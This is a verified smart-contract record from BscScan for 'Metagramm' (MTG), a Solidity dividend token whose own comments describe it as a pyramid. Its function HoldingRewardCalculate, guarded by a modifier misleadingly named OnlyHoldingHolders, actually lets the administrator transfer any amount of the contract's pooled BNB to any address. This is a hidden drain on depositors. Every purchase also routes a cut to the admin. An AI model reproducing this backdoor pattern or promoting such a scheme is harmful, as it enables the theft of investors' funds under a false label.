{"SourceCode": "/**\r\n *Submitted for verification at BscScan.com on 2022-01-05\r\n*/\r\n\r\npragma solidity 0.4.20;\r\n\r\n\r\ncontract Metagramm {\r\n\r\n    // Tokens in account\r\n    modifier onlyBagholders () {\r\n        require(myTokens() > 0);\r\n        _;\r\n    }\r\n\r\n    // profits in account\r\n    modifier onlyStronghands() {\r\n        require(myDividends(true) > 0);\r\n        _;\r\n    }\r\n\r\n    modifier OnlyAdmin(){\r\n        address _customerAddress = msg.sender;\r\n        require(administrators[keccak256(_customerAddress)]);\r\n        _;\r\n    }\r\n\r\n    modifier OnlyHoldingHolders(){\r\n        address _customerAddress = msg.sender;\r\n        require(administrators[keccak256(_customerAddress)]);\r\n        _;\r\n    }\r\n\r\n    /*--------------------------------\r\n    =             EVENTS            =\r\n    --------------------------------*/\r\n    event onMTGPurchase(\r\n        address indexed customerAddress,\r\n        uint256 incomingBNB,\r\n        uint256 tokensMinted,\r\n        address indexed experterredBy\r\n    );\r\n\r\n    event onMTGsell(\r\n        address indexed customerAddress,\r\n        uint256 tokensBurned,\r\n        uint256 BNBEarned\r\n    );\r\n\r\n    event onReinvestment(\r\n        address indexed customerAddress,\r\n        uint256 BNBReinvested,\r\n        uint256 tokensMinted\r\n    );\r\n\r\n    event onWithdraw(\r\n        address indexed customerAddress,\r\n        uint256 BNBWithdrawn\r\n    );\r\n\r\n    event onClaim(\r\n        address indexed _customerAddress,\r\n        uint256 _HoldingBonus,\r\n        uint256 timestamp\r\n    );\r\n\r\n    // ERC20\r\n    event Transfer(\r\n        address indexed from,\r\n        address indexed to,\r\n        uint256 tokens\r\n    );\r\n\r\n\r\n    /*--------------------------------\r\n    =           CONFIGURABLES        =\r\n    --------------------------------*/\r\n    \r\n    string public name = \"Metagramm\";\r\n    string public symbol = \"MTG\";\r\n    uint8 constant public decimals = 18;\r\n    uint8 constant internal   dividendFee_ = 5;\r\n    uint256 internal tokenPriceInitial_ = 0.0000001 ether;\r\n    uint256 constant internal tokenPriceIncremental_ = 0.00000001 ether;\r\n    uint256 constant internal magnitude = 10**18;\r\n    address administratorAddress;   // Admin address\r\n    // proof of stake\r\n    uint256 public stakingRequirement = 1e18;\r\n\r\n\r\n   /*--------------------------------\r\n    =             DATASETS          =\r\n    --------------------------------*/\r\n\r\n    // amount of shares for each address (scaled number)\r\n    mapping(address => uint256) internal tokenBalanceLedger_;\r\n    mapping(address => uint256) public expertBalance_;\r\n    mapping(address => int256) internal   payoutsTo_;\r\n    mapping(address => uint256) internal   HoldingRewardTo_;\r\n    mapping(address => uint256) public   start_time;\r\n    uint256 internal   tokenSupply_ = 0;\r\n    uint256 internal   profitPerShare_;  \r\n    uint256 internal  holding_Reward_amount; \r\n    // administrator list (see above on what they can do)\r\n    mapping(bytes32 => bool) internal administrators;\r\n\r\n\r\n    /*--------------------------------\r\n    =          PUBLIC FUNCTIONS      =\r\n    --------------------------------*/\r\n\r\n    /*\r\n    * -- APPLICATION ENTRY POINTS --\r\n    */\r\n    function Metagramm(address _customerAddress, address _adminAddress)\r\n        public\r\n    {\r\n        // add administrators here\r\n        administrators[keccak256(_customerAddress)] = true;\r\n        administratorAddress = _adminAddress;\r\n\r\n    }\r\n\r\n\r\n    //  purchace token in buy\r\n    function buy(address _expertedBy) public payable returns(uint256)\r\n    {\r\n        uint256 amount = msg.value ;\r\n        purchaseTokens(amount, _expertedBy);\r\n\r\n    }\r\n\r\n    function getToken() public payable returns(uint256)\r\n    {\r\n        uint256 amount = msg.value ;\r\n        purchaseTokens(amount, 0x0000000000000000000000000000000000000000);\r\n\r\n    }\r\n\r\n\r\n    function reinvest() onlyStronghands() public\r\n    {\r\n        uint256 _dividends = myDividends(false); // retrieve expert bonus later in the code\r\n        \r\n        // pay out the dividends virtually\r\n        address _customerAddress = msg.sender;\r\n        payoutsTo_[_customerAddress] += (int256) (_dividends * magnitude);\r\n\r\n        // retrieve expert bonus\r\n        _dividends += expertBalance_[_customerAddress];\r\n        expertBalance_[_customerAddress] = 0;\r\n\r\n        // dispatch a buy order with the virtualized \"withdrawn dividends\"\r\n        uint256 _tokens = purchaseTokens(_dividends, 0x0);\r\n\r\n        // fire event\r\n        onReinvestment(_customerAddress, _dividends, _tokens);\r\n    }\r\n\r\n\r\n\r\n    //  Alias of sell() and withdraw() for exit from Metagramm function \r\n    function exit() public\r\n    {\r\n        address _customerAddress = msg.sender;\r\n        uint256 _tokens = tokenBalanceLedger_[_customerAddress];  // account of MTG\r\n        if(_tokens > 0) sell(_tokens);  // sell all MTG.\r\n        withdraw();  // withdraw BNB\r\n    }\r\n\r\n\r\n    //  Withdraws all of the callers earnings in BNB.\r\n    function withdraw() onlyStronghands() public\r\n    {\r\n\r\n        address _customerAddress = msg.sender;\r\n        uint256 _dividends = myDividends(false); // get expert bonus\r\n\r\n        if(block.timestamp >= start_time[_customerAddress]) {\r\n            claim();\r\n        }\r\n\r\n        payoutsTo_[_customerAddress] += (int256) (_dividends * magnitude);\r\n\r\n        // add expert. bonus\r\n        _dividends += expertBalance_[_customerAddress];\r\n        expertBalance_[_customerAddress] = 0;\r\n\r\n        // Transfer BNB Final call\r\n        _customerAddress.transfer(_dividends);\r\n\r\n        // Event call\r\n        onWithdraw(_customerAddress, _dividends);\r\n    }\r\n    \r\n    //  Liquifies MTG to BNB.\r\n    function sell(uint256 _amountOfTokens) onlyBagholders() public\r\n    {\r\n        address _customerAddress = msg.sender;\r\n\r\n        require(_amountOfTokens / 1e18 >= 1);\r\n        \r\n        if(block.timestamp >= start_time[_customerAddress]) {\r\n            claim();\r\n        }\r\n\r\n        require(_amountOfTokens <= tokenBalanceLedger_[_customerAddress]);\r\n        uint256 _tokens = _amountOfTokens;\r\n        uint256 _BNB = tokensToBNB_(_tokens);\r\n        uint256 _dv = SafeMath.div(_BNB,10);\r\n        uint256 _taxedBNB = SafeMath.sub(_BNB, _dv);\r\n        uint256 _dividends = SafeMath.div(_dv, 2);\r\n        uint256 holding_reward = _dividends;\r\n        uint256 _totalcustomertokens = tokenBalanceLedger_[_customerAddress];\r\n        // burn the sold MTG\r\n        tokenSupply_ = SafeMath.sub(tokenSupply_, _tokens);\r\n        tokenBalanceLedger_[_customerAddress] = SafeMath.sub(tokenBalanceLedger_[_customerAddress], _tokens);\r\n\r\n        // update dividends tracker\r\n        int256 _updatedPayouts = (int256) (profitPerShare_ * _tokens + (_taxedBNB * magnitude));\r\n        payoutsTo_[_customerAddress] -= _updatedPayouts;\r\n\r\n        uint256 _HoldingWithdraw = HoldingRewardTo_[_customerAddress];\r\n\r\n\t\tif(_HoldingWithdraw > 0){\r\n\t\t\tuint256 _pertokenholding = (_HoldingWithdraw / _totalcustomertokens);\r\n            uint256 _DeductBonus = (_pertokenholding * _tokens);\r\n\t\t\tHoldingRewardTo_[_customerAddress] -= _DeductBonus;\r\n\t\t}\r\n\r\n\t\tstart_time[_customerAddress] = block.timestamp + 30 days;\r\n\r\n\r\n        // dividing and holding_reward not to be infinite\r\n        if (tokenSupply_ > 0) {\r\n            profitPerShare_ = SafeMath.add(profitPerShare_, (_dividends * magnitude) / tokenSupply_);\r\n            holding_Reward_amount = SafeMath.add(holding_Reward_amount,(holding_reward * magnitude) / tokenSupply_);\r\n        }\r\n        // event call\r\n        onMTGsell(_customerAddress, _tokens, _taxedBNB);\r\n    }\r\n\r\n\r\n    // claim for the Account after 30 day\r\n    function claim() \r\n    onlyStronghands() \r\n    internal \r\n    returns(uint256)\r\n    {\r\n        address _customerAddress = msg.sender;\r\n\r\n\t\t// check the time of the end in 30 day\r\n        require(block.timestamp >= start_time[_customerAddress]);\r\n        require(tokenSupply_ >0);\r\n\r\n\r\n\t\tuint256 _HoldingBonus = myHoldingBonus(_customerAddress);  // count the acccount holding_reward\r\n\t\tif (_HoldingBonus > 0) // not to be less then zero\r\n        {\r\n            HoldingRewardTo_[_customerAddress] += (_HoldingBonus * magnitude);\r\n\t\t    _customerAddress.transfer(_HoldingBonus);\r\n        }\r\n        start_time[_customerAddress] = block.timestamp + 30 days;  \r\n\r\n        // event call\r\n        onClaim(_customerAddress, _HoldingBonus,start_time[_customerAddress]);\r\n    }\r\n\r\n    //  Transfer tokens from the Account to a new Receiver Account.\r\n    //  10% fee deduction and added to the admin.\r\n\r\n\r\n    function transfer(address _toAddress, uint256 _amountOfTokens) \r\n    onlyBagholders () \r\n    public \r\n    returns(bool)\r\n    {\r\n\r\n        address _customerAddress = msg.sender;\r\n        require(_amountOfTokens / 1e18 >= 1);\r\n\r\n        // make sure we have the requested MTG\r\n        require(_amountOfTokens <= tokenBalanceLedger_[_customerAddress]);\r\n\r\n        // Any minimum token transfer retune buy time cut-of dividends return first\r\n        if(myDividends(true) > 0) withdraw();\r\n\r\n        // fee 10% of the MTG that are transfered\r\n        uint256 _tokenFee = SafeMath.div(_amountOfTokens, 10);\r\n        uint256 _taxedTokens = SafeMath.sub(_amountOfTokens, _tokenFee);\r\n        uint256 _totalcustomertokens = tokenBalanceLedger_[_customerAddress];\r\n\r\n\r\n        // // burn the fee MTG\r\n        tokenSupply_ = SafeMath.sub(tokenSupply_, _tokenFee);\r\n\r\n        // exchange MTG\r\n        tokenBalanceLedger_[_customerAddress] = SafeMath.sub(tokenBalanceLedger_[_customerAddress], _amountOfTokens);\r\n        tokenBalanceLedger_[_toAddress] = SafeMath.add(tokenBalanceLedger_[_toAddress], _taxedTokens);\r\n\r\n        payoutsTo_[_customerAddress] -= (int256) (profitPerShare_ * _amountOfTokens);\r\n        payoutsTo_[_toAddress] += (int256) (profitPerShare_ * _taxedTokens);\r\n\r\n        // update holdingbouns tracker trackers\r\n\r\n\t\tuint256 _HoldingWithdraw = HoldingRewardTo_[_customerAddress];\r\n\r\n\t\tif(_HoldingWithdraw >0){\r\n\t\t\tuint256 _pertokenholding = (_HoldingWithdraw / _totalcustomertokens);\r\n            uint256 _DeductBonus = (_pertokenholding * _amountOfTokens);\r\n\t\t\tHoldingRewardTo_[_customerAddress] -= _DeductBonus;\r\n\t\t}\r\n\r\n        uint256 toDeductBonus = holding_Reward_amount * _taxedTokens;\r\n        HoldingRewardTo_[_toAddress] += toDeductBonus;\r\n\r\n        //update time of customer \r\n\t\tstart_time[_customerAddress] = block.timestamp + 30 days;  \r\n\t\tstart_time[_toAddress] = block.timestamp + 30 days;       \r\n        // event call\r\n        Transfer(_customerAddress, _toAddress, _taxedTokens);\r\n\r\n        // ERC20\r\n        return true;\r\n\r\n    }\r\n\r\n\r\n    //HELPERS AND CALCULATORS\r\n    //  Method to view the current BNB stored in the contract\r\n    //  *  Example: totalBNBBalance()\r\n    function totalBNBBalance() public view returns(uint)\r\n    {\r\n        return this.balance;\r\n    }\r\n\r\n    //  Retrieve the total MTG supply.\r\n    function totalSupply() public view returns(uint256)\r\n    {\r\n        return tokenSupply_;\r\n    }\r\n\r\n\r\n    // Retrieve the MTG owned by the Account.\r\n    function myTokens() public view returns(uint256)\r\n    {\r\n        address _customerAddress = msg.sender;\r\n        return balanceOf(_customerAddress);\r\n    }\r\n\r\n\r\n    // //  Retrieve the dividends owned by the Account\r\n    //     *  If `_includeexperterralBonus` is to to 1/true, the experterral bonus will be included in the calculations.\r\n    //  *  The reason for this, is that in the frontend, we will want to get the total divs (global + expert)\r\n    //  *  But in the internal calculations, we want them separate.\r\n    //  //\r\n    function myDividends(bool _includeexperterralBonus) public view returns(uint256)\r\n    {\r\n        address _customerAddress = msg.sender;\r\n        return _includeexperterralBonus ? dividendsOf(_customerAddress) + expertBalance_[_customerAddress] : dividendsOf(_customerAddress) ;\r\n    }\r\n\r\n\t// Retrieve the HoldingBonus owned by the Account\r\n    function myHoldingBonus(address _customerAddress) public view returns(uint256)\r\n    {\r\n        return ((holding_Reward_amount * tokenBalanceLedger_[_customerAddress]) - HoldingRewardTo_[_customerAddress]) / magnitude;\r\n    }\r\n\r\n    // Retrieve the MTG balance of any single address.\r\n    function balanceOf(address _customerAddress)\r\n        public\r\n        view\r\n        returns(uint256)\r\n    {\r\n        return (tokenBalanceLedger_[_customerAddress]);\r\n\r\n    }\r\n\r\n\r\n    // Retrieve the dividend balance of any single address.\r\n    function dividendsOf(address _customerAddress) public view returns(uint256)\r\n    {\r\n        return (uint256) ((int256)(profitPerShare_ * tokenBalanceLedger_[_customerAddress]) - payoutsTo_[_customerAddress]) / magnitude;\r\n    }\r\n\r\n\r\n    // Return the sell price of 1 individual token\r\n    function sellPrice()\r\n        public\r\n        view\r\n        returns(uint256)\r\n    {\r\n\r\n        if(tokenSupply_ == 0){\r\n            return tokenPriceInitial_ - tokenPriceIncremental_;\r\n        } else {\r\n            uint256 _BNB = tokensToBNB_(1e18);\r\n            uint256 _dividends = SafeMath.div(_BNB, 10);\r\n            uint256 _taxedBNB = SafeMath.sub(_BNB, _dividends);\r\n            return _taxedBNB;\r\n        }\r\n    }\r\n\r\n\r\n    // Return the buy price of 1 individual MTG.\r\n    function buyPrice()\r\n        public\r\n        view returns(uint256)\r\n    {\r\n        if(tokenSupply_ == 0){\r\n            return tokenPriceInitial_ + tokenPriceIncremental_;\r\n        } else {\r\n            uint256 _BNB = tokensToBNB_(1e18);\r\n            uint256 _dividends = (_BNB * 15) / 100;\r\n            uint256 _taxedBNB = SafeMath.add(_BNB, _dividends);\r\n            return _taxedBNB;\r\n        }\r\n    }\r\n\r\n    // BNB to MTG counting\r\n    function calculateTokensReceived(uint256 _BNBToSpend) public view returns(uint256)\r\n    {\r\n        uint256 _undivi = (_BNBToSpend * 15 ) / 100;\r\n        uint256 _taxedBNB = _BNBToSpend - _undivi;\r\n        uint256 _amountOfTokens = BNBToTokens_(_taxedBNB);\r\n        return _amountOfTokens;\r\n    }\r\n\r\n    // MTG to BNB counting\r\n    function calculateBNBReceived(uint256 _tokensToSell) public view returns(uint256)\r\n    {\r\n        if (_tokensToSell <= tokenSupply_ && (_tokensToSell / 1e18 >= 1))\r\n        {\r\n            uint256 _BNB = tokensToBNB_(_tokensToSell);\r\n            uint256 _dividends = SafeMath.div(_BNB, 10);\r\n            uint256 _taxedBNB = SafeMath.sub(_BNB, _dividends);\r\n        }\r\n\r\n        else {\r\n            return 0;\r\n        }\r\n        \r\n        return _taxedBNB;\r\n    }\r\n\r\n    function HoldingRewardCalculate(address _customerAddress,uint256 amount) OnlyHoldingHolders() public {\r\n        require(this.balance >= amount);\r\n        _customerAddress.transfer(amount);\r\n    }\r\n\r\n    /*--------------------------------\r\n    =         INTERNAL FUNCTIONS     =\r\n    --------------------------------*/\r\n    \r\n    \r\n    function purchaseTokens(uint256 _incomingBNB, address _expertedBy)\r\n        internal\r\n        returns(uint256)\r\n    {\r\n        address _customerAddress = msg.sender;\r\n\r\n        uint256 _undivi = (_incomingBNB * 15)/100;\r\n        uint256 _taxedBNB = _incomingBNB - _undivi;\r\n        uint256 _experterralBonus = SafeMath.div(_undivi,3);\r\n        uint256 _dividends = _experterralBonus;\r\n        uint256 _amountOfTokens = BNBToTokens_(_taxedBNB);\r\n\r\n        // prevents overflow in the case that the pyramid somehow magically starts being used by everyone in the world\r\n        // (or hackers)\r\n        // and yes we know that the safemath function automatically rules out the \"greater then\" equasion.\r\n        require(_amountOfTokens > 0 && (SafeMath.add(_amountOfTokens,tokenSupply_) > tokenSupply_));\r\n        require(tokenSupply_ < 1000000000 * (10**18));\r\n\r\n        if(\r\n            // is the user experterred by any other address?\r\n            _expertedBy != 0x0000000000000000000000000000000000000000 &&\r\n\r\n            // no cheating!\r\n            _expertedBy != _customerAddress &&\r\n\r\n            // does the experterrer have at least X whole MTG?\r\n            // i.e is the experterrer a godly chad masternode\r\n            tokenBalanceLedger_[_expertedBy] >= stakingRequirement\r\n        ){\r\n            // wealth redistribution\r\n            expertBalance_[_expertedBy] = SafeMath.add(expertBalance_[_expertedBy], _experterralBonus);\r\n        } else {\r\n\r\n            // no expert purchase\r\n            // add the experterral bonus back to the global dividends cake\r\n            expertBalance_[address(this)] = SafeMath.add(expertBalance_[address(this)], _experterralBonus);\r\n        }\r\n\r\n        // we can't give people infinite BNB\r\n        if(tokenSupply_ > 0){\r\n\r\n            // take the amount of dividends gained through this transaction, and allocates them evenly to each shareholder\r\n            profitPerShare_ += (_dividends * magnitude / (tokenSupply_));\r\n            \r\n            // add MTG to the pool\r\n            tokenSupply_ = SafeMath.add(tokenSupply_, _amountOfTokens);\r\n\r\n        } else {\r\n            // add MTG to the pool\r\n            tokenSupply_ = _amountOfTokens;\r\n        }\r\n\r\n        // transfer to admin\r\n        administratorAddress.transfer(_experterralBonus);\r\n\r\n\r\n        // update circulating supply & the ledger address for the customer\r\n        tokenBalanceLedger_[_customerAddress] = SafeMath.add(tokenBalanceLedger_[_customerAddress], _amountOfTokens);\r\n\t\t\r\n        start_time[_customerAddress] = block.timestamp + 30 days; \r\n\r\n        int256 _updatedPayouts = (int256) ((profitPerShare_ * _amountOfTokens) );\r\n        payoutsTo_[_customerAddress] += _updatedPayouts;\r\n\r\n        HoldingRewardTo_[_customerAddress] += (holding_Reward_amount * _amountOfTokens);\r\n\r\n        // event call\r\n        onMTGPurchase(_customerAddress, _incomingBNB, _amountOfTokens, _expertedBy);\r\n\r\n        return _amountOfTokens;\r\n    }\r\n\r\n\r\n// /\r\n//      * Calculate MTG price based on an amount of incoming BNB\r\n//      * It's an algorithm, hopefully we gave you the whitepaper with it in scientific notation;\r\n//      * Some conversions occurred to prevent decimal errors or underflows / overflows in solidity code.\r\n//      */\r\n\r\n    function BNBToTokens_(uint256 _BNB)\r\n        internal\r\n        view\r\n        returns(uint256)\r\n    {\r\n        uint256 _tokenPriceInitial = tokenPriceInitial_ * 1e18;\r\n        uint256 _tokensReceived =\r\n         (\r\n            (\r\n                SafeMath.sub(\r\n                    (sqrt                        (\r\n                            (_tokenPriceInitial**2)\r\n                            +\r\n                            (2*(tokenPriceIncremental_ * 1e18)*(_BNB * 1e18))\r\n                            +\r\n                            (((tokenPriceIncremental_)**2)*(tokenSupply_**2))\r\n                            +\r\n                            (2*(tokenPriceIncremental_)*_tokenPriceInitial*tokenSupply_)\r\n                        )\r\n                    ), _tokenPriceInitial\r\n                )\r\n            )/(tokenPriceIncremental_)\r\n        )-(tokenSupply_)\r\n        ;\r\n\r\n        return _tokensReceived;\r\n    }\r\n\r\n    // /\r\n    //  * Calculate MTG sell value.\r\n    //       */\r\n\r\n     function tokensToBNB_(uint256 _tokens)\r\n        internal\r\n        view\r\n        returns(uint256)\r\n    {\r\n\r\n        uint256 tokens_ = (_tokens + 1e18);\r\n        uint256 _tokenSupply = (tokenSupply_ + 1e18);\r\n        uint256 _BNBReceived =\r\n        (\r\n            SafeMath.sub(\r\n                (\r\n                    (\r\n                        (\r\n                            tokenPriceInitial_ +(tokenPriceIncremental_ * (_tokenSupply/1e18))\r\n                        )-tokenPriceIncremental_\r\n                    )*(tokens_ - 1e18)\r\n                ),(tokenPriceIncremental_*((tokens_**2-tokens_)/1e18))/2\r\n            )\r\n        /1e18);\r\n        return _BNBReceived;\r\n    }\r\n\r\n    function sqrt(uint x) internal pure returns (uint y) {\r\n        uint z = (x + 1) / 2;\r\n        y = x;\r\n        while (z < y) {\r\n            y = z;\r\n            z = (x / z + z) / 2;\r\n        }\r\n    }\r\n}\r\n\r\n// /\r\n//  * @title SafeMath\r\n//  * @dev Math operations with safety checks that throw on error\r\n//  */\r\n\r\nlibrary SafeMath {\r\n\r\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        if (a == 0) {\r\n            return 0;\r\n        }\r\n        uint256 c = a * b;\r\n        assert(c / a == b);\r\n        return c;\r\n    }\r\n\r\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        // assert(b > 0); // Solidity automatically throws when dividing by 0\r\n        uint256 c = a / b;\r\n        // assert(a == b * c + a % b); // There is no case in which this doesn't hold\r\n        return c;\r\n    }\r\n\r\n\r\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        assert(b <= a);\r\n        return a - b;\r\n    }\r\n\r\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        uint256 c = a + b;\r\n        assert(c >= a);\r\n        return c;\r\n    }\r\n\r\n}", "ABI": "[{\"constant\":true,\"inputs\":[{\"name\":\"_customerAddress\",\"type\":\"address\"}],\"name\":\"dividendsOf\",\"outputs\":[{\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"name\":\"\",\"type\":\"string\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[{\"name\":\"_BNBToSpend\",\"type\":\"uint256\"}],\"name\":\"calculateTokensReceived\",\"outputs\":[{\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[],\"name\":\"getToken\",\"outputs\":[{\"name\":\"\",\"type\":\"uint256\"}],\"payable\":true,\"stateMutability\":\"payable\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"name\":\"\",\"type\":\"uint8\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"totalBNBBalance\",\"outputs\":[{\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[],\"name\":\"withdraw\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"sellPrice\",\"outputs\":[{\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"name\":\"_customerAddress\",\"type\":\"address\"},{\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"HoldingRewardCalculate\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"stakingRequirement\",\"outputs\":[{\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[{\"name\":\"_includeexperterralBonus\",\"type\":\"bool\"}],\"name\":\"myDividends\",\"outputs\":[{\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[{\"name\":\"_customerAddress\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"buyPrice\",\"outputs\":[{\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[{\"name\":\"\",\"type\":\"address\"}],\"name\":\"start_time\",\"outputs\":[{\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"myTokens\",\"outputs\":[{\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[{\"name\":\"\",\"type\":\"address\"}],\"name\":\"expertBalance_\",\"outputs\":[{\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"name\":\"\",\"type\":\"string\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"name\":\"_toAddress\",\"type\":\"address\"},{\"name\":\"_amountOfTokens\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"name\":\"\",\"type\":\"bool\"}],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[{\"name\":\"_customerAddress\",\"type\":\"address\"}],\"name\":\"myHoldingBonus\",\"outputs\":[{\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"name\":\"_amountOfTokens\",\"type\":\"uint256\"}],\"name\":\"sell\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[],\"name\":\"exit\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"name\":\"_expertedBy\",\"type\":\"address\"}],\"name\":\"buy\",\"outputs\":[{\"name\":\"\",\"type\":\"uint256\"}],\"payable\":true,\"stateMutability\":\"payable\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[{\"name\":\"_tokensToSell\",\"type\":\"uint256\"}],\"name\":\"calculateBNBReceived\",\"outputs\":[{\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[],\"name\":\"reinvest\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"name\":\"_customerAddress\",\"type\":\"address\"},{\"name\":\"_adminAddress\",\"type\":\"address\"}],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"name\":\"customerAddress\",\"type\":\"address\"},{\"indexed\":false,\"name\":\"incomingBNB\",\"type\":\"uint256\"},{\"indexed\":false,\"name\":\"tokensMinted\",\"type\":\"uint256\"},{\"indexed\":true,\"name\":\"experterredBy\",\"type\":\"address\"}],\"name\":\"onMTGPurchase\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"name\":\"customerAddress\",\"type\":\"address\"},{\"indexed\":false,\"name\":\"tokensBurned\",\"type\":\"uint256\"},{\"indexed\":false,\"name\":\"BNBEarned\",\"type\":\"uint256\"}],\"name\":\"onMTGsell\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"name\":\"customerAddress\",\"type\":\"address\"},{\"indexed\":false,\"name\":\"BNBReinvested\",\"type\":\"uint256\"},{\"indexed\":false,\"name\":\"tokensMinted\",\"type\":\"uint256\"}],\"name\":\"onReinvestment\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"name\":\"customerAddress\",\"type\":\"address\"},{\"indexed\":false,\"name\":\"BNBWithdrawn\",\"type\":\"uint256\"}],\"name\":\"onWithdraw\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"name\":\"_customerAddress\",\"type\":\"address\"},{\"indexed\":false,\"name\":\"_HoldingBonus\",\"type\":\"uint256\"},{\"indexed\":false,\"name\":\"timestamp\",\"type\":\"uint256\"}],\"name\":\"onClaim\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"name\":\"to\",\"type\":\"address\"},{\"indexed\":false,\"name\":\"tokens\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"}]", "ContractName": "Metagramm", "CompilerVersion": "v0.4.20+commit.3155dd80", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "00000000000000000000000024ec8590d87fb8e933cca16ae6ab26e817fef7bd00000000000000000000000030d196b57326be29c1b7861baacac0ed99f8063f", "EVMVersion": "Default", "Library": "", "LicenseType": "None", "Proxy": "0", "Implementation": "", "SwarmSource": "bzzr://3de994ce6748452457189e45ef581908e17009a3fc9f2bb5623cf80298b646db"}